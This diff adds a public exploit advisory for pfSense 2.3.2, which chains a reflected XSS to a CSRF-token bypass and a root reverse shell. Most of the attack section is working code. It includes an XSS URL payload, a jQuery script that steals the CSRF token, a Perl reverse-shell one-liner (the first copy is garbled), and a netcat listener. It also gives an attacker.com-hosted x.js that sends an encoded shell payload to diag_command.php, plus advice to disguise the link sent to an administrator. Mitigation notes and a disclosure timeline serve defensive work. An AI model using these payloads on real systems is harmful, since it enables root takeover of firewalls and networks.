@@ -1,0 +1,295 @@
+######################################################################
+# Exploit Title: pfSense 2.3.2 XSS - CSRF-bypass & Reverse-root-shell
+# Date: 01/03/2017
+# Author: Yann CAM @ASafety / Synetis
+# Vendor or Software Link: www.pfsense.org
+# Version: 2.3.2
+# Category: XSS, CSRF-bypass and Remote root reverse-shell Access
+# Google dork:
+# Tested on: FreeBSD
+######################################################################
+
+
+pfSense firewall/router distribution description :
+======================================================================
+
+pfSense is a free, open source customized distribution of FreeBSD tailored for use as a firewall and router. In addition 
+to being a powerful, flexible firewalling and routing platform, it includes a long list of related features and a package 
+system allowing further expandability without adding bloat and potential security vulnerabilities to the base distribution. 
+pfSense is a popular project with more than 1 million downloads since its inception, and proven in countless installations 
+ranging from small home networks protecting a PC and an Xbox to large corporations, universities and other organizations 
+protecting thousands of network devices. 
+
+This project started in 2004 as a fork of the m0n0wall project, but focused towards full PC installations rather than the 
+embedded hardware focus of m0n0wall. pfSense also offers an embedded image for Compact Flash based installations, however 
+it is not our primary focus.
+
+In version 2.3.2 of the distribution, differents XSS vulnerabilities allow CSRF security mechanisms bypass and RCE reverse 
+root shell can be triggered. It is strongly advised to update to version 2.3.2 available now.
+
+Demonstration video : https://www.youtube.com/watch?v=IWtf6LlfP_c&t=4s
+
+
+Proof of Concept 1 - Reflected Cross-Site Scripting :
+======================================================================
+
+There are several RXSS in GET parameter available on the pfSense WebGui, example :
+
+File status_captiveportal_expire.php lines 69-73 :
+  $cpzone = $_GET['zone'];
+  if (isset($_POST['zone'])) {
+    $cpzone = $_POST['zone'];
+  }
+  $cpzone = strtolower($cpzone);
+
+then reflection lines 100-104 :
+
+  $tab_array[] = array(gettext("Active Users"), false, "status_captiveportal.php?zone={$cpzone}");
+  $tab_array[] = array(gettext("Active Vouchers"), false, "status_captiveportal_vouchers.php?zone={$cpzone}");
+  $tab_array[] = array(gettext("Voucher Rolls"), false, "status_captiveportal_voucher_rolls.php?zone={$cpzone}");
+  $tab_array[] = array(gettext("Test Vouchers"), false, "status_captiveportal_test.php?zone={$cpzone}");
+  $tab_array[] = array(gettext("Expire Vouchers"), true, "status_captiveportal_expire.php?zone={$cpzone}");
+
+List of parameters vulnerable to reflected XSS:
+
+* status_captiveportal.php: "order", "zone"
+* status_captiveportal_expire.php: "zone"
+* status_captiveportal_test.php: "zone"
+* status_captiveportal_voucher_rolls.php: "zone"
+* status_captiveportal_vouchers.php: "zone"
+  
+Result with a direct call to this page (authenticated session) :
+
+  http://<PFSENSE>/status_captiveportal_expire.php?zone="><script>alert(1337);</script>
+
+These RXSS are through GET parameters, so they are triggered directly on page loading (doesn't need any CSRF token).
+CSRF token security mechanism protect only RXSS through POST parameters in the pfSense context.
+
+Proof of Concept 2 - Bypass all CSRF protection via R-XSS :
+======================================================================
+
+Via the R-XSS in GET parameter identified previously, it's possible for an attacker to bypass all CSRFMagic mechanisms 
+in the pfSense WebGUI.
+
+Through this XSS in GET param, an attacker can benefit of the current pfSense context in a victim's browser already 
+logged as administrator in pfSense web administration interface.
+Via this XSS, the attacker can forge his own and hidden request in the victim browser, with :
+
+* Right referer for bypassing anti-CSRF mechanisms
+* Request page to get a valid CSRF token to forge final form submissions with admin rights
+
+The next piece of JavaScript-JQuery can make any CSRF with right referer and security token retrieved in pfSense context :
+
+  // Function with JQuery AJAX request
+  // This function requests an internal WebGUI page, which contains the token.
+  // Source code of this webpage is passed to the extractToken() function.
+  function loadToken(){
+    $.ajax({
+      type: 'POST',
+      url: '/diag_command.php',
+      contentType: 'application/x-www-form-urlencoded;charset=utf-8',
+      dataType: 'text',
+      data: '',
+      success:extractToken
+    }); // after this request, we called the extractToken() function to extract the token
+  }
+   
+  // Function called after AJAX request in a defined page of the context, which contains the token value
+  function extractToken(response){
+    // response var contain the source code of the page requested by AJAX
+    // Regex to catch the token value
+    var regex = new RegExp("<input type='hidden' name='__csrf_magic' value=\"(.*)\" />",'gi');
+    var token = response.match(regex);
+    token = RegExp.$1;
+    // Pass the token to the final function which make the CSRF final attack
+    //alert(token);
+    makeCSRF(token);
+  }
+
+If this script is loaded from the previous XSS, all web-forms in the pfSense WebGui can be submitted as a legitimate 
+and authenticated user (like administrator).
+
+
+Proof of Concept 3 : R-XSS to CSRF to Remote Reverse root Shell
+======================================================================
+
+pfSense distribution provides some internal tools / commands like "perl".
+
+Example of one-liner Perl reverse-root-shell in command line :
+
+  [2.3.2-RELEASE][admin@pfSense.localdomain]/usr/local/www: perl -e 'use Socket;$i="[ATTACKER_IP]";$p=[ATTACKER_PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STen(STDERR,">&S");exec("/bin/sh -i");};'
+
+Plus, through the WebGui as administrator, it's possible to execute system command (shell) directly in the web browser as root user :
+
+  http://<PFSENSE>/diag_command.php
+
+POST parameter for command execution to this page are (via PHP script) :
+
+  txtCommand=&txtRecallBuffer=&dlPath=&ulfile=&txtPHPCommand=[PAYLOAD]&submit=EXECPHP&__csrf_magic=[CSRFTOKEN]
+
+So, by chaining the R-XSS, bypass any anti-CSRF protection and with some AJAX calls with right referer / right CSRF token, 
+an attacker can gain a full reverse-shell as root on the pfSense :
+
+1/ Step one : the attacker puts a netcat in listen mode on port 4444 on his computer 
+
+  $ nc -l -vv -p 4444  
+  
+2/ Step two : the attacker puts the next x.js JavaScript file on his webserver http://attacker.com/x.js :
+
+  var hash = window.location.hash.substring(1);
+  var lhost = hash.substring(hash.indexOf("lhost=")+6, hash.indexOf("&"));
+  var lport = hash.substring(hash.indexOf("lport=")+6, hash.length);
+
+  var payload='system%28%27%2fusr%2flocal%2fbin%2fperl%20-e%20%5C%27use%20Socket%3B%24i%3D%22' + lhost + '%22%3B%24p%3D' + lport + '%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%5C%27%27%29%3B';
+
+  // Function with JQuery AJAX request
+  // This function requests an internal WebGUI page, which contains the token.
+  // Source code of this webpage is passed to the extractToken() function.
+  function loadToken(){
+  $.ajax({
+  type: 'POST',
+  url: '/diag_command.php',
+  contentType: 'application/x-www-form-urlencoded;charset=utf-8',
+  dataType: 'text',
+  data: '',
+  success:extractToken
+  }); // after this request, we called the extractToken() function to extract the token
+  }
+   
+  // Function called after AJAX request in a defined page of the context, which contains the token value
+  function extractToken(response){
+  // response var contain the source code of the page requested by AJAX
+  // Regex to catch the token value
+  var regex = new RegExp("<input type='hidden' name='__csrf_magic' value=\"(.*)\" />",'gi');
+  var token = response.match(regex);
+  token = RegExp.$1;
+  // Pass the token to the final function which make the CSRF final attack
+  //alert(token);
+  makeCSRF(token);
+  }
+   
+  // This function use JQuery AJAX object.
+  // The token var is needed to perform the right CSRF attack with the context referer
+  function makeCSRF(token){
+  // Final CSRF attack with right referer (because executed in the context)
+  // and with right token captured above
+  $.ajax({
+  type: 'POST',
+  url: '/diag_command.php',
+  contentType: 'application/x-www-form-urlencoded;charset=utf-8',
+  dataType: 'text',
+  data: 'txtCommand=&txtRecallBuffer=&dlPath=&ulfile=&txtPHPCommand=' + payload + '&submit=EXECPHP&__csrf_magic=' + token
+  }); // payload of your choice
+  }
+
+  if (trigger){
+  } else {
+    var trigger = function(){
+      // Load JQuery dynamically in the targeted context
+      var headx = document.getElementsByTagName('head')[0];
+      var jq = document.createElement('script');
+      jq.type = 'text/javascript';
+      jq.src = 'http://code.jquery.com/jquery-latest.min.js';
+      headx.appendChild(jq);
+      // Waiting 2 secondes for correct loading of JQuery added dynamically.
+      // Then, run the first AJAX request in the WebGUI context to retrieve the token
+      setTimeout('loadToken()', 2000);
+    };
+    trigger();
+  }
+
+3/ Step three : the attacker generates the RXSS / anti-CSRF / RCE-root final URL :
+
+  http://<PFSENSE>/status_captiveportal_expire.php?zone="><script src="http://attacker.com/x.js"></script>#lhost=[ATTACKER_IP]&lport=[ATTACKER_PORT]
+  
+4/ Finaly, the attacker sends this URL (hidden via bitly.com for example) to a pfSense sysadmin and wait for the reverse root shell.
+
+Tested and validated with Firefox latest version 50.1.0.
+
+I have created some BeEF modules to exploit the same vulnerability / scenario.
+
+This full PoC can be seen in the demonstration video here : https://www.youtube.com/watch?v=IWtf6LlfP_c&t=4s
+
+pfSense 2.3.2 contains several security mechanisms and security best-practices like:
+
+- X-Frame-Option header
+- POST form-submission token anti-CSRF
+- Referer checking to protect against CSRF
+
+But just with a simple RXSS in GET, all these security best-practices can be bypassed to gain a full reverse root shell remotely.
+
+
+Mitigation:
+======================================================================
+
+I suggest to double-check all $_GET/$_POST params directly reflected in the pfSense PHP source code without sanitization.
+Plus, some HTTP headers can be added in pfSense for a better security, like:
+
+- X-XSS-Protectoin
+- X-Content-Type-Options
+- CSP header
+- Etc.
+  
+  
+Solution:
+======================================================================
+2017-02-20:  Release 2.3.3
+
+
+Additional resources :
+======================================================================
+
+- www.pfsense.org
+- www.synetis.com
+- blog.pfsense.org/?p=2325
+- www.asafety.fr
+- www.youtube.com/watch?v=IWtf6LlfP_c&t=4s
+- doc.pfsense.org/index.php/2.3.3_New_Features_and_Changes
+- pfsense.org/security/advisories/pfSense-SA-17_01.webgui.asc
+- github.com/pfsense/pfsense/pull/3288
+- github.com/pfsense/pfsense/pull/3288/commits/9ec212fb11e4b2825acda68279c7e9553186c06d
+- github.com/pfsense/pfsense/pull/3288/commits/992dd571bcad6508ccea0f478491183d7c7e3c4c
+- github.com/beefproject/beef/commit/2f632bcbcd0a73ff2d300110bfdec81986e88285
+
+
+Report timeline :
+======================================================================
+
+2016-12-17 : Vulnerability found
+2016-12-18 : pfSense team alerted with details, PoC, mitigation proposal through github pull request
+2016-12-18 : pfSense team feedback via github
+2017-02-20 : pfSense 2.3.3 release with fix
+2017-02-22 : BeEF module pull request
+2017-03-01 : Public advisory
+
+
+
+Credits :
+======================================================================
+
+    88888888
+   88      888                                         88    88
+  888       88                                         88
+  788           Z88      88  88.888888     8888888   888888  88    8888888.
+   888888.       88     88   888    Z88   88     88    88    88   88     88
+       8888888    88    88   88      88  88       88   88    88   888
+            888   88   88    88      88  88888888888   88    88     888888
+  88         88    88  8.    88      88  88            88    88          888
+  888       ,88     8I88     88      88   88      88   88    88  .88     .88
+   ?8888888888.     888      88      88    88888888    8888  88   =88888888
+       888.          88
+                    88    www.synetis.com
+                 8888  Consulting firm in management and information security
+
+Yann CAM - Security Researcher @ASafety / Security Consultant @Synetis
+
+
+
+Last word :
+======================================================================
+
+Thank you to all the pfSense team for professionalism and quality solution despite of these few weaknesses.
+
+-- 
+SYNETIS
+CONTACT: www.synetis.com
